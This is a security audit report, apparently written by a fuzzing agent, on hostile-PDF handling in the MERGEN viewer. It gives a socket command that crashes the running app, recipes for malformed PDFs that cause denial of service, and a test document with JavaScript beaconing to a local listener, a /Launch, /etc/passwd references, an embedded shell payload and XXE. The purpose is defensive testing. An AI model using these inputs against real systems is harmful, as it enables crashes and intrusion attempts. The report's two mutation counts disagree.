# X1 — Adversarial PDF / fuzzing audit

**Agent:** X1 (hostile document input)
**Target:** MERGEN @ branch `ata`, commit `472183b`
**Scope:** the PDF as untrusted input. Everything reachable by opening a document:
`Document::openPath/openData/unlock/renderPage/words/search/properties/outline/pageLinks/contentHash`,
`PageView::relayout`, `MainWindow::printDocument`.
**Environment:** Arch Linux, poppler 26.08.0-1.1, poppler-qt6 26.08.0-1.1, qt6-base 6.11.2-2,
gcc, `-fsanitize=address,undefined`, `QT_QPA_PLATFORM=offscreen`.
**Status:** COMPLETE.

## Method

ASAN+UBSan build:

```
cmake -S <repo> -B /tmp/fuzzasan -G Ninja -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_CXX_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g" -Wno-dev
cmake --build /tmp/fuzzasan
```

Harness `/tmp/fz/fuzz.cpp` links MERGEN's own object files (minus `main.cpp.o`) and drives,
per input file, in order: `openPath` -> `unlock` x4 (if locked) -> `pageCount` -> `contentHash`
-> `outline` -> `properties` -> `pageSize` sweep -> `words(0)` -> `search(0)` -> `pageLinks(0)`
-> `renderPage(0, 1.0)` -> `renderPage(0, 600/72)` (the print path scale) -> `PageView::setDocument`
(which is `relayout` + fit-width) -> `setZoom(10)` -> `setFitPage` -> `rotateClockwise` x2
-> `scrollToPage(last)` -> `linkAt` sweep over the viewport -> `setZoom(0.1)` -> `openData` round trip.
Each stage prints a marker with elapsed ms, so a hang or crash is attributed to a stage.

Corpus is produced by `/tmp/fz/mkpdf.py` + `gen_corpus.py` + `gen2.py` (raw PDF writer, no deps).
Triggering inputs are copied to `docs/audit/corpus/`.

---

## Summary — most severe first

| # | Finding | Where the defect is | Severity |
|---|---|---|---|
| F-01 | Null-deref SEGV on **any** encrypted document; every accessor but `contentHash` affected. Demonstrated end-to-end kill of the shipped binary via the control socket during the password prompt | **MERGEN** — `isOpen()` does not exclude locked; crash lands in poppler (`Catalog::getNumPages`, reached from `document.cpp:116`) | **Critical** |
| F-02 | Unvalidated `/MediaBox` reaches `qRound()` in `relayout()` — abort in Debug, UB + silent 1x1 page collapse in shipped Release | **MERGEN** — `pageview.cpp:227-228` | High |
| F-03 | `flattenOutline` recurses with no depth limit — stack overflow (measured ~210-260 B/level), plus a superlinear main-thread freeze (55 s at depth 20 000) | **MERGEN** — `document.cpp:144`; slow walk is poppler's, run unguarded on the GUI thread | High |
| F-04 | Signed integer overflow in `relayout()` (`pageview.cpp:231`) and `restoreAnchor()` (`pageview.cpp:1087`) in the **shipped Release** build | **MERGEN** | High |
| F-05 | Synchronous CPU-time DoS: 257 s in `properties()` on a 9 MB file; 173 s in `renderPage`; 203 s at 100 k pages; 8.6 min in compare mode; 821 MB RSS at 300 k pages | **MERGEN** — unbounded, uncancellable, on the GUI thread; hot loops are poppler's | High |
| G-01 | "No network, no JavaScript, no forms, no URLs" — **verified, holds** under direct attack | — | Pass |

**Campaign:** 12 000 mutations run (4 000 naive + 6 000 structure-aware + 2 000 codec-targeted);
489 faults; **2** distinct signatures, both rediscoveries of F-01 and F-04; **0** previously-unknown
bug classes.

**Calibration note.** F-01's crash executes inside libpoppler, but the *defect* is MERGEN's: poppler
documents its locked state and MERGEN does not consult it. F-02, F-03's missing bound, and F-04 are
MERGEN's own arithmetic and recursion with no poppler involvement. F-05's hot loops are poppler's;
MERGEN's failure is calling them unbounded on the UI thread when it already owns a worker-thread
pattern (`SearchWorker`) that does this correctly.

---

## Findings

### F-01 — CRITICAL — NULL-pointer dereference (SEGV) in every `Document` accessor on ANY encrypted / locked document

**Input:** `docs/audit/corpus/enc_real_aes256.pdf` — a *completely ordinary* AES-256 encrypted PDF,
produced by stock qpdf with no malice at all:

```
qpdf --encrypt --user-password=secret --owner-password=owner --bits=256 -- test.pdf enc_real_aes256.pdf
```

Also reproduced by three hand-built malformed-encryption files:
`enc_empty_dict.pdf` (`/Encrypt << >>`), `enc_fake_standard.pdf` (`/Filter /Standard /V 2 /R 3` with
garbage `/O` and `/U`), `enc_unsupported_handler.pdf` (`/Filter /EvilHandler`).

**What happens:** `openPath()` returns `LoadStatus::NeedsPassword` and *keeps the poppler handle*
(`document.cpp:66-70`). `Document::isOpen()` therefore returns **true**. Calling
`Document::pageCount()` on that handle segfaults:

```
==91873==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000280
==91873==The signal is caused by a READ memory access.
==91873==Hint: address points to the zero page.
    #0 0x... in pthread_mutex_lock (/usr/lib/libc.so.6+0x9b934)
    #1 0x... in Catalog::getNumPages() (/usr/lib/libpoppler.so.163+0x106a33)
    #2 0x... in mergen::Document::pageCount() const <repo>/src/document.cpp:116
```

No `unlock()` call is required — the probe crashes with `openPath()` immediately followed by
`pageCount()` (`mode=0`). Register `rdi = 0x270` confirms a null `this`.

**Root cause:** poppler's `PDFDoc::setup()` bails out of `checkEncryption()` *before* it constructs
the `Catalog`, leaving `catalog == nullptr`, and `PDFDoc::getNumPages()` does not null-check it.
poppler-qt6's `DocumentData::init()` deliberately accepts such a document
(`doc->isOk() || doc->getErrorCode() == errEncrypted`) and just sets `locked = true`. So *every*
undecrypted document is a live `Poppler::Document` whose `numPages()` null-derefs.

**Where it lands:** the fault is inside libpoppler; it is reached from
`<repo>/src/document.cpp:116` (`Document::pageCount`). MERGEN's defect is that
`pageCount()` — and `isOpen()`, which gates it everywhere — draws no distinction between "open"
and "open but still locked".

**Reachability in the shipped application:** `MainWindow::openPath` (`mainwindow.cpp:542`) calls
`promptForPassword()` on `NeedsPassword`, which runs a **nested event loop**
(`QInputDialog::getText`, `mainwindow.cpp:653-671`). A modal dialog blocks user input to other
widgets but does **not** block socket or timer events. The control socket stays live, and its
`goto` handler is:

```cpp
// mainwindow.cpp:757-761
if (!m_doc->isOpen()) {              // TRUE for a locked document
    return err(QStringLiteral("no document"));
}
if (page < 1 || page > m_doc->pageCount()) {   // <-- SEGV here
```

So `echo 'goto 1' | nc -U $XDG_RUNTIME_DIR/mergen-$UID.sock` while the password prompt is on screen
kills the process. Opening any password-protected PDF puts the application in that window.

**CONFIRMED EMPIRICALLY against the real `mergen` binary** (not the harness). Launch the shipped
binary on the ordinary qpdf-encrypted file, wait for the password dialog, then send one line to the
control socket:

```
$ mergen /tmp/fz/corpus/enc_real_aes256.pdf &        # password dialog is now up
$ python3 -c "import socket; s=socket.socket(socket.AF_UNIX); \
              s.connect('/run/user/1000/mergen-1000.sock'); s.sendall(b'goto 1\n')"

launched mergen pid 239893 on an encrypted PDF (password dialog is now up)
control socket present: True
process alive before command: True
sent 'goto 1' over the control socket; reply = b''
RESULT: process DIED, exit/signal code = -11 (-11 = SIGSEGV)
```

The reply is empty because the process dies inside the handler, before `client->write()`. This is a
complete, reproducible crash of the shipped application triggered by a benign encrypted PDF plus one
line on a socket the application itself opens by default.

A second latent instance: `MainWindow::onPageChanged` (`mainwindow.cpp:620`) calls
`m_doc->pageCount()` *before* it tests `m_doc->isOpen()` on the next line — the order is wrong even
though `isOpen()` would not have saved it here.

**Severity:** Critical. Reachable with a benign, standards-conforming encrypted PDF; a null-deref
DoS today, and it is a raw null-`this` call into a C++ virtual-ish object, so it is the kind of
defect that stops being "just a crash" if any offset ever exceeds a page.

**Scope — it is not just `pageCount`.** Each accessor was called in isolation on a freshly opened,
still-locked `enc_real_aes256.pdf`. **Every one of them except `contentHash()` crashes:**

| accessor | result on a locked document |
|---|---|
| `pageCount()` | CRASH — `Catalog::getNumPages` |
| `properties()` | CRASH — inside `Document::properties` itself |
| `outline()` | CRASH — `Catalog::getOutline` |
| `pageSize()` | CRASH — `Catalog::getNumPages` |
| `renderPage()` | CRASH — `Catalog::getNumPages` |
| `words()` | CRASH — `Catalog::getNumPages` |
| `search()` | CRASH — `Catalog::getNumPages` |
| `pageLinks()` | CRASH — `Catalog::getNumPages` |
| `contentHash()` | OK (returns a 64-char hash — it reads the file, not the catalog) |

The guards those accessors already carry (`if (!m_doc || index < 0 || index >= m_doc->numPages())`)
are themselves the crash, because the bounds check *is* the null-deref.

**Fix direction:** MERGEN must not hand a locked handle to anything. Because the exposure is the
whole accessor surface rather than one function, the right fix is the narrow one at the root:

```cpp
bool isOpen() const { return m_doc != nullptr && !m_doc->isLocked(); }   // document.h:99
```

That closes the socket path and every other caller at once, and it matches what `isOpen()` already
means everywhere it is used. `Document::unlock()` must then stop short-circuiting on
`if (!m_doc->isLocked()) return true;` becoming meaningless — it stays correct, since it tests the
poppler handle directly rather than `isOpen()`. Per-accessor early returns (option (a)) would also
work but are eight edits instead of one and are easy to forget on the next accessor added.
Upstream, poppler's `PDFDoc::getNumPages()` should null-check `catalog`.

---

### F-02 — HIGH — unvalidated page geometry reaches `qRound()` in `PageView::relayout()`: process abort in Debug, undefined behaviour + silent page collapse in the shipped Release build

**Inputs:** `docs/audit/corpus/mb_1e9.pdf` (`/MediaBox [0 0 1000000000 1000000000]`),
`mb_intmax.pdf` (`[0 0 2147483647 2147483647]`), `mb_int64.pdf`
(`[0 0 9223372036854775807 9223372036854775807]`), `mb_1e18.pdf` (`[0 0 1e18 1e18]`).
poppler passes these MediaBox values through unchanged — `pageSize(0)` reports `1e+09 x 1e+09`.

**The code (`<repo>/src/pageview.cpp:223-231`):**

```cpp
for (QSizeF points : m_pageSizes) {
    if (quarterTurn) { points.transpose(); }
    const int w = qMax(1, qRound(points.width() * m_zoom));    // line 227
    const int h = qMax(1, qRound(points.height() * m_zoom));   // line 228
    m_layout.append(QRect(0, y, w, h));
    widest = qMax(widest, w);
    y += h + kPageGap;                                          // line 231
}
```

`points.width()` comes straight from the document. Nothing bounds it before it is multiplied by
`m_zoom` and forced into an `int`.

**Debug build — hard abort:**

```
[stage     43 ms] PageView zoom 10.0 (max)
==87436==ERROR: AddressSanitizer: ABRT on unknown address 0x03e80001558c
    #5 0x... in qt_assert(char const*, char const*, int)
    #6 0x... in int QtPrivate::qCheckedFPConversionToInteger<int, double, true, true>(double)
                 /usr/include/qt6/QtCore/qnumeric.h:523
    #7 0x... in qRound(double) /usr/include/qt6/QtCore/qnumeric.h:572
    #8 0x... in mergen::PageView::relayout() <repo>/src/pageview.cpp:227
    #9 0x... in mergen::PageView::applyScale(double, Poppler::Page::Rotation) pageview.cpp:1112
    #10 0x... in mergen::PageView::setZoom(double) pageview.cpp:1121
```

Qt 6.11's `qRound(double)` is `qCheckedFPConversionToInteger<int>(...)`, which `Q_ASSERT`s that the
value is in `int` range. `mb_1e9` survives *opening* only because fit-width clamps zoom to
`kMinZoom = 0.10` (1e9 * 0.1 = 1e8, in range) — it dies the moment the reader zooms in.
`mb_int64.pdf` and `mb_1e18.pdf` die immediately inside `setDocument()`, before the window is drawn.

**Shipped Release build — NOT an abort:** `MERGEN/CMakeLists.txt:19` and `packaging/PKGBUILD:25`
both build `Release`, where Qt's CMake config defines `QT_NO_DEBUG` and `Q_ASSERT` compiles to
nothing. `qRound` degenerates to `int(d + 0.5)` — an out-of-range double→int conversion, which is
**undefined behaviour**. On x86-64 `cvttsd2si` yields `INT_MIN`, `qMax(1, INT_MIN)` yields `1`, and
the enormous page silently renders as a **1x1 pixel box**. See F-02b for the Release measurement.

**Where it lands:** entirely MERGEN's own code, `pageview.cpp:227-228` (and `231`). Not poppler's —
poppler faithfully reported the size the document asked for.

**Severity:** High. Guaranteed process death on a Debug/`QT_FORCE_ASSERTS` build; UB plus a silent
wrong-rendering in Release. The same unchecked value feeds `QRect`, the scrollbar ranges and the
render cache.

**Fix direction:** clamp page dimensions where they enter — in `Document::pageSize()`, or at the top
of `relayout()` — to something a viewport can mean (e.g. reject/limit above 200 000 pt, the PDF
spec's own 14 400 pt limit being the honest bound), and use `qSaturateRound()` (Qt provides it, right
next to `qRound`, with defined saturating behaviour) rather than `qRound()` for any value derived
from document data. `y` should also be widened to `qint64` or checked, per F-03.

---

### F-03 — HIGH — unbounded recursion in MERGEN's own `flattenOutline` (`document.cpp:144`): stack overflow, plus a superlinear UI freeze

**Input:** `docs/audit/corpus/outline_deep10k.pdf` — 10 000 outline items, each the sole `/First`
child of the one above it (1.3 MB). Also `outline_deep200k.pdf` (200 000 levels, 24 MB) and the
depth ladder in `/tmp/fz/depth/d*.pdf`. Construction (see `corpus/gen_corpus.py`):

```
/Catalog /Outlines 20 0 R
20: << /Type /Outlines /First 21 0 R /Last 21 0 R /Count 1 >>
21: << /Title (L0) /Parent 20 0 R /First 22 0 R /Last 22 0 R /Count 1 /Dest [10 0 R /Fit] >>
22: << /Title (L1) /Parent 21 0 R /First 23 0 R /Last 23 0 R /Count 1 /Dest [10 0 R /Fit] >>
...  N levels deep
```

**The code — this is MERGEN's, not poppler's (`document.cpp:120-149`):**

```cpp
void flattenOutline(const QVector<Poppler::OutlineItem> &items, int depth,
                    QVector<OutlineEntry> &out) {
    for (const Poppler::OutlineItem &item : items) {
        ...
        if (item.hasChildren()) {
            flattenOutline(item.children(), depth + 1, out);   // line 144 — no bound
        }
    }
}
```

`depth` is carried only so the overlay can indent; it is never compared against a limit. Reached
from `Document::outline()` (`document.cpp:157`), called synchronously on the **main thread** by
`MainWindow::showOutline` (`mainwindow.cpp:1334`) — i.e. by pressing `Ctrl+T`.

**Sanitizer report (ASAN, Release+ASAN build, depth 10 000):**

```
==99258==ERROR: AddressSanitizer: stack-overflow on address 0x7ffe8b272ff8
    #9  0x... in OutlineItem::open()   (/usr/lib/libpoppler.so.163+0x1fa80b)
    #10 0x... in OutlineItem::hasKids() (/usr/lib/libpoppler.so.163+0x1fa96d)
    #11 0x... in flattenOutline <repo>/src/document.cpp:143
    #12 0x... in flattenOutline <repo>/src/document.cpp:144
    #13 0x... in flattenOutline <repo>/src/document.cpp:144
    ... (repeats to the frame limit)
```

**CALIBRATION — measured, not assumed.** ASAN inflates stack frames, so the 10 000 figure above is
not the shipped threshold. Measured on the **plain `-O2` Release binary** by varying `ulimit -s`:

| stack | depth OK | depth SIGSEGV |
|---|---|---|
| 512 KB | 2 000 | 3 000 |
| 1 MB   | 3 000 | 5 000 |
| 8 MB (Linux default) | 20 000 (survives) | — not reached within 180 s |

That is roughly **210-260 bytes of stack per level**. Extrapolated, the default 8 MB main-thread
stack overflows at approximately **35 000-40 000 levels**.

**The second half of the finding — the freeze.** Reaching that depth is slow because poppler's
outline walk is superlinear. Wall time for `Document::outline()` alone, plain Release binary:

| depth | 2 000 | 5 000 | 10 000 | 12 000 | 15 000 | 20 000 |
|---|---|---|---|---|---|---|
| time | 0.30 s | 1.57 s | 6.45 s | 10.4 s | 19.5 s | **55.1 s** |

So on a stock desktop the practical symptom of `outline_deep*.pdf` is not a crash but a **frozen,
unrepainting window** — 55 seconds for a 2.7 MB file, growing worse than quadratically, with no
cancel and no progress, because `outline()` is called synchronously on the GUI thread. The 200 000
level file never returns in any time a reader would wait.

**Where it lands:** the missing depth bound is **MERGEN's** (`document.cpp:144`). The superlinear
cost is **poppler's** (`OutlineItem::open()` / `XRef::fetch`), reached from that same line; MERGEN
does not defend against it and runs it on the UI thread.

**Severity:** High. Unbounded, fully attacker-controlled recursion depth. A guaranteed multi-minute
UI freeze on any desktop from one keystroke, and a genuine stack-overflow crash wherever the stack
is smaller than default — a hardened `LimitSTACK` unit, a non-default `ulimit -s`, or any
debug/ASAN build.

**Fix direction:** cap the depth (a flat, indented overlay list is meaningless past ~32 levels) and
return early past the cap; better still, rewrite `flattenOutline` as an explicit worklist loop,
which removes the recursion entirely and is barely longer. Add a total-entry cap as well, so a
200 000-item outline cannot make the overlay unusable, and consider bounding the work or moving it
off the GUI thread.

**Note on cycles — MERGEN got lucky here, not careful:** `outline_cycle2.pdf` (A→B→A via `/First`),
`outline_self.pdf` (item whose `/First` is itself) and `outline_next_cycle.pdf` (`/Next` sibling
loop) all complete cleanly in under a second. That is **poppler's** loop detection in
`Outline`/`OutlineItem`, not MERGEN's — `flattenOutline` has no visited-set and would recurse
forever if poppler ever stopped catching it. The depth ladder above proves the recursion itself is
genuinely unbounded; the cycle cases simply never reach it.

---

### F-04 — HIGH — signed integer overflow in `PageView::relayout()` and `restoreAnchor()` in the SHIPPED Release build

Confirmed with a `Release` (`QT_NO_DEBUG`) + UBSan build — i.e. the configuration MERGEN actually
ships (`CMakeLists.txt:19`, `packaging/PKGBUILD:25`).

**F-04a — `pageview.cpp:231`, the layout `y` accumulator.**
Input: `docs/audit/corpus/many_huge_pages.pdf` — 20 000 pages, each `/MediaBox [0 0 200000 200000]`.

```
<repo>/src/pageview.cpp:231:11: runtime error: signed integer overflow:
    2146012888 + 2000012 cannot be represented in type 'int'
    #0 mergen::PageView::relayout() <repo>/src/pageview.cpp:231
    #1 mergen::PageView::applyScale(double, Poppler::Page::Rotation) pageview.cpp:1112
```

`int y` accumulates `h + kPageGap` once per page with no bound. Neither the per-page height nor the
page count is limited, so the column height is fully attacker-controlled. After the wrap, `y` is
negative, `m_content` is nonsense, and the scrollbar ranges, `visibleRange()`, `captureAnchor()` and
every hit test derived from `m_layout` are computed from corrupt rectangles.

**F-04b — `pageview.cpp:1087`, `restoreAnchor()`.**
Inputs: `docs/audit/corpus/mb_1e9.pdf`, `mb_intmax.pdf`. Triggered by `setFitPage()` after a zoom.

```
<repo>/src/pageview.cpp:1087:43: runtime error: signed integer overflow:
    -2147483636 - 239 cannot be represented in type 'int'
    #0 mergen::PageView::restoreAnchor(mergen::PageView::Anchor const&) pageview.cpp:1087
    #1 mergen::PageView::applyScale(double, Poppler::Page::Rotation) pageview.cpp:1113
```

```cpp
const int targetY = page.top() + qRound(anchor.fy * page.height());
verticalScrollBar()->setValue(targetY - viewport()->height() / 2);   // line 1087
```

`targetY` is `INT_MIN` because it inherited the out-of-range `qRound` result described in F-02;
subtracting half the viewport height then overflows.

**Honest caveat on detection:** GCC's `-fsanitize=undefined` does **not** enable
`float-cast-overflow` by default — verified with a standalone micro-test, which printed
`-2147483648` silently. So the primary `qRound` conversion UB of F-02 is invisible to a default
UBSan build; only the Debug `Q_ASSERT` and these downstream integer overflows expose it.

**Severity:** High. UB in the shipped configuration, reached by opening a file.

**Fix direction:** widen `y`/`m_content` to `qint64` and clamp once at the end, or bound the page
dimensions and page count at their source as in F-02. `qSaturateRound()` everywhere a
document-derived double becomes an `int`.

---

### F-05 — HIGH — synchronous CPU-time denial of service: a document can freeze the UI for minutes. Nothing in MERGEN bounds, cancels or backgrounds this work

Every one of these runs on the **GUI thread**, with no progress indication, no cancel, and no work
limit. Measured on the plain `-O2` Release binary (the shipped configuration), peak RSS sampled via
`wait4`/`getrusage`:

| input | MERGEN entry point | wall time | peak RSS |
|---|---|---|---|
| `fonts_40k_spread.pdf` | `Document::properties()` — `document.cpp:283` | **257 s** (4m 17s) | 124 MB |
| `flate_bomb_content.pdf` | `Document::renderPage()` — `document.cpp:395` | **173 s** | 46 MB |
| `flate_bomb_content.pdf` | `Document::words()` — `document.cpp:405` | **160 s** | 45 MB |
| `flate_bomb_nested.pdf` | `Document::words()` | **43 s** | 45 MB |
| `fonts_5k.pdf` | `Document::properties()` | **26.7 s** | 78 MB |
| `outline_deep10k.pdf` | `Document::outline()` — `document.cpp:157` | 8.5 s | 53 MB |
| `many_huge_pages.pdf` | `Document::properties()` | 4.3 s | 97 MB |

**F-05a — the font table (worst case, 257 s).** `docs/audit/corpus/fonts_40k_spread.pdf`:
2 000 pages, each carrying 20 distinct `/Type /Font` objects = 40 000 font entries, 9 MB file.
`Document::properties()` does two full-document walks:

```cpp
const QList<Poppler::FontInfo> fonts = m_doc->fonts();     // document.cpp:283 — scans EVERY page
...
for (int i = 0; i < m_doc->numPages(); ++i) {              // document.cpp:299 — and again
    const std::unique_ptr<Poppler::Page> page = m_doc->page(i);
    for (const std::unique_ptr<Poppler::Annotation> &annot : page->annotations()) { ... }
}
```

`Poppler::Document::fonts()` walks the whole document; MERGEN then re-walks every page for
annotations. Reached by pressing **`Ctrl+I`** (`MainWindow::showProperties`, `mainwindow.cpp:1438`).
The header comment at `document.h:112-114` says this work is deferred "never at open time: it walks
the font table, which is work no reader asked for until they ask" — the deferral is correct, but the
work is still unbounded and still synchronous once asked for.

`fonts_5k.pdf` (5 000 fonts on a **single** page, 700 KB) already costs 26.7 s.

**F-05b — decompression bombs are CPU bombs, not memory bombs.**
`docs/audit/corpus/flate_bomb_content.pdf` is a 1 MB file whose page `/Contents` is a
`/FlateDecode` stream of 1 GB of `'A'`. `flate_bomb_nested.pdf` nests six `/FlateDecode` filters
over 256 MB. Both cost 43-173 s in `words()` / `renderPage()`.

**Peak RSS never exceeded 46 MB** for either. This is a genuine and reportable *negative* result:
poppler streams the inflate rather than buffering it, so there is **no unbounded allocation** here —
the damage is purely CPU time spent tokenising a gigabyte of content-stream operators. A 512 MB
`/FlateDecode` image XObject (`flate_bomb_image.pdf`) renders in 3.5 s at 46 MB, also bounded.

**Where it lands:** the expensive loops are **inside poppler** (`Poppler::Document::fonts()`,
`Lexer`/`Parser` over the inflated stream), reached from `document.cpp:283`, `395`, `405` and `157`.
MERGEN's defect is that it calls them on the GUI thread with no bound, no timeout and no cancel —
MERGEN already proved it knows how to do this properly, since `SearchWorker` (`document.h:160`,
`document.cpp:437`) runs search on a worker thread *with* a cancel flag. Nothing else got that
treatment.

**Severity:** High. A 9 MB file makes the application unresponsive for over four minutes on one
keystroke; the compositor will offer to kill it as a hung client long before it returns.

**Fix direction:** the `SearchWorker` pattern already in the codebase is the answer — move
`properties()`, `outline()` and page rendering onto a worker with the same `QAtomicInt` cancel flag,
and cap the reported font/annotation counts (a properties overlay that says "40 000 fonts" is no
more useful than one that says "more than 1 000"). Failing that, bound the walk itself.

**CORRECTION — page-count abuse via a *shared* page object does not work, but via *distinct* page
objects it does.** An earlier draft of this section reported `pages_1M_shared.pdf` (1 M `/Kids`
entries all pointing at one page object) as a harmless 804 ms. That was wrong: re-measurement shows
that file reports **`pageCount = 0`** — poppler refuses to build a page tree that reuses a single
page object, so the document simply opens empty. The same is true of `shared_200k_pages.pdf` and
`count_100M.pdf` (a `/Count` of 100 000 000 over one real kid): all three report zero pages. A
`/Count` that lies is correctly ignored; poppler trusts the `/Kids` walk, not the number.

Rebuilt with **distinct** page objects (`corpus/pages_100k_real.pdf`,
`corpus/pages_300k_real.pdf`), the page-count bomb is effective:

| input | pages | `setDocument` (relayout) | `properties()` | peak RSS |
|---|---|---|---|---|
| `pages_100k_real.pdf` | 100 000 | 3.2 s | **203 s** | 307 MB |
| `pages_300k_real.pdf` | 300 000 | 4.7 s | **>240 s (timeout)** | **821 MB** |

`PageView::setDocument` (`pageview.cpp:127-134`) eagerly calls `m_doc->pageSize(i)` for *every* page
at open time, and each call constructs a `Poppler::Page`; 300 000 of them cost 821 MB of resident
memory before a single pixel is drawn. `properties()` then walks all of them again for annotations.

**F-05c — compare mode amplifies this by 2x over the whole document.**
`MainWindow::enterCompare` (`mainwindow.cpp:1099-1104`) loops
`qMin(m_doc->pageCount(), m_compareDoc->pageCount())` and renders **both** documents on every
iteration, synchronously:

```cpp
const int pages = qMin(m_doc->pageCount(), m_compareDoc->pageCount());
for (int page = 0; page < pages; ++page) {
    const QImage left  = m_doc->renderPage(page, kDiffScale, ...);
    const QImage right = m_compareDoc->renderPage(page, kDiffScale, ...);
```

Measured at 5.14 ms per page-pair on `pages_100k_real.pdf`, so `Ctrl+D` comparing that document
against itself is **8.6 minutes** of frozen UI. There is no page cap, no cancel and no progress.

**Bounded, honest negatives from the same batch — these attacks genuinely do NOT work:**
`links_200k.pdf` (200 000 link annotations on one page) resolves and hit-tests in 402 ms;
`Document::pageLinks` builds the vector once and `PageView::linksOf` caches it per page
(`pageview.cpp:487-496`), so the linear `linkAt` scan on every mouse move is over a cached vector,
not a re-parse. `annots_50k.pdf` (50 000 highlight annotations) reports properties in 201 ms.
Annotation and link count abuse are not effective against MERGEN.

**The print path is also safe, and that is poppler's doing.** `renderPage` at the 600 DPI print cap
(`kPrintDpiCap`, `mainwindow.cpp:67`) on hostile geometry produces no unbounded allocation: poppler
prints `Bogus memory allocation size` and hands back a 1x1 image rather than attempting the
allocation.

| input at 600 DPI (scale 8.33) | result |
|---|---|
| `mb_1e9.pdf` (1e9 x 1e9 pt) | `1x1`, not null |
| `mb_intmax.pdf` | `1x1`, not null |
| `many_huge_pages.pdf` (200 000 pt) | `Bogus memory allocation size` -> `1x1` |
| `mb_negative.pdf` (`[0 0 -595 -842]`) | `4958x7017` — falls back to a sane default |
| `mb_zero.pdf` (`[0 0 0 0]`) | `5100x6600` — falls back to US Letter |

So the rasteriser is defended and `MainWindow::printDocument` inherits that defence. The unguarded
arithmetic of F-02/F-04 is MERGEN's own layout code, not the renderer.

---

### G-01 — PASS — the "no network, no JavaScript, no forms, opens no URLs" guarantees HOLD under direct attack

`strace` is not installed on this host, so instrumentation was done with an `LD_PRELOAD` interposer
(`/tmp/fz/netwatch.c`, built to `/tmp/fz/netwatch.so`) hooking `socket`, `connect`, `getaddrinfo`,
`execve`, `execvp`, `system` and `popen`, logging only `AF_INET`/`AF_INET6` (so the legitimate
`AF_UNIX` control socket is not counted as network). The interposer was self-tested against a
program that really does connect to `127.0.0.1:9999` and correctly logged both the `socket()` and
the `connect()`. A listener was held on `127.0.0.1:9999` throughout to catch any beacon.

**Attack documents.** `docs/audit/corpus/js_network_kitchen_sink.pdf` carries, in one file:

```
/Catalog /OpenAction << /S /JavaScript /JS (this.getURL('http://127.0.0.1:9999/js');
                                            app.launchURL('http://127.0.0.1:9999/x');) >>
         /Names << /JavaScript ... /JS (Net.HTTP; app.alert('pwned');
                                        this.submitForm('http://127.0.0.1:9999/submit');) >>
                /EmbeddedFiles ... (payload.sh -> "touch /tmp/fz/PWNED_EMBEDDED")
         /AcroForm << /Fields [...] /NeedAppearances true >>
/Page    /AA << /O << /S /JavaScript /JS (app.alert(2)) >> >>
/Widget  /AA << /K << /S /JavaScript /JS (app.alert(1)) >> >>
```

Plus `links_hostile.pdf` (`/URI` to `http://127.0.0.1:9999/beacon`, `/Launch` of `/usr/bin/xcalc`,
`/GoToR` to `/etc/passwd`, and `/GoTo` destinations of `2147483647` and `-5`), `xfa_xxe.pdf` and
`xmp_xxe.pdf` (XML external entities pointing at `http://127.0.0.1:9999/`), and the repository's own
`evil.pdf`.

**Result — both at the `Document` API level (full harness sweep) and with the real `mergen` binary
opening each file:**

| document | `AF_INET`/`AF_INET6` sockets | `connect` | `getaddrinfo` | child `exec` |
|---|---|---|---|---|
| `js_network_kitchen_sink.pdf` | 0 | 0 | 0 | 0 |
| `links_hostile.pdf` | 0 | 0 | 0 | 0 |
| `xfa_xxe.pdf` | 0 | 0 | 0 | 0 |
| `xmp_xxe.pdf` | 0 | 0 | 0 | 0 |
| `evil.pdf` | 0 | 0 | 0 | 0 |

The only `EXEC` line in any log is the process's own startup `execvp`. The beacon listener recorded
nothing but the interposer self-test. `/tmp/fz/PWNED_EMBEDDED` was never created. No JavaScript ran.

`evil.pdf` does exactly what is claimed and nothing more — it opens, renders two pages, and
`properties()` reports:

```
[warn] This document carries embedded JavaScript. MERGEN never runs it.
[warn] This document contains form fields. MERGEN does not fill forms.
```

The three-warning case (`js_network_kitchen_sink.pdf`) adds
`This document has files attached to it. MERGEN does not open them.` — all three warning paths in
`document.cpp:329-341` fire correctly.

`Document::pageLinks` (`document.cpp:151-186`) is the reason the link vectors are inert: it drops
everything whose `linkType() != Poppler::Link::Goto`, drops `isExternal()` Goto links, and bounds
the destination with `if (target < 0 || target >= m_doc->numPages()) continue;` — so `/URI`,
`/Launch` and `/GoToR` never become navigable objects at all, and the out-of-range and negative
`/GoTo` destinations are discarded rather than clamped. `flattenOutline` does the same at
`document.cpp:132`: an entry with a non-empty `externalFileName()` or `uri()` is listed with
`page = -1` and does nothing. This is correct and deliberate.

The control socket is `srwx------` (0700, user-only) at `/run/user/1000/mergen-1000.sock`, matching
the `QLocalServer::UserAccessOption` in `control.cpp:28`.

**One defence-in-depth observation, not a violation.** Arch's `libpoppler` is built *with* libcurl:

```
$ ldd /usr/lib/libpoppler.so.163 | grep libcurl
        libcurl.so.4 => /usr/lib/libcurl.so.4
$ nm -D /usr/lib/libpoppler.so.163 | grep curl_easy
        U curl_easy_init@CURL_OPENSSL_4
        U curl_easy_perform@CURL_OPENSSL_4      (+ 4 more)
```

so `mergen` loads `libcurl`, `libssl` and `libcrypto` into its address space transitively. MERGEN
itself contains no network code whatsoever — a case-insensitive grep for `curl|http|QNetwork|ssl`
across `src/` returns only a local variable named `curl` in the empty-state page-corner drawing at
`pageview.cpp:856`. poppler's HTTP loader (`CurlPDFDocBuilder`) is only reachable through a URL
document handle, which poppler-qt6 does not expose and MERGEN never constructs. So the guarantee
holds behaviourally and by API reachability, but it is enforced by *not calling* the HTTP stack
rather than by *not having* one. If the guarantee is meant to be structural, a `seccomp` filter
rejecting `socket(AF_INET|AF_INET6, ...)` at startup would make it so, and would cost nothing since
MERGEN legitimately needs only `AF_UNIX`.

**Severity:** none — this is a pass. Recorded because it was a claimed guarantee and it was tested
directly rather than assumed.

---

## Mutation fuzzing campaign — 10 000 mutations, 484 faults, 2 distinct signatures

**Detector validated first.** A campaign reporting zero faults is worthless unless the detector is
known to fire, so the three known-bad files were pushed through the *identical* pipeline before the
numbers below were trusted:

```
enc_real_aes256   ASAN
mb_intmax         UBSAN
outline_deep200k  ASAN
```

All three were caught. The pipeline detects.

**Round 1 — 4 000 mutations, naive, repo seeds only.**
Seeds: `test.pdf`, `outline.pdf`, `outline-v2.pdf`, `annot.pdf`, `colour.pdf`, `evil.pdf`.
Strategies: multi-bit flips, byte overwrites, truncation, magic-integer splicing
(`0`, `-1`, `2147483647`, `-2147483648`, `1e400`, `9223372036854775807`, `nan`, `inf`, structural
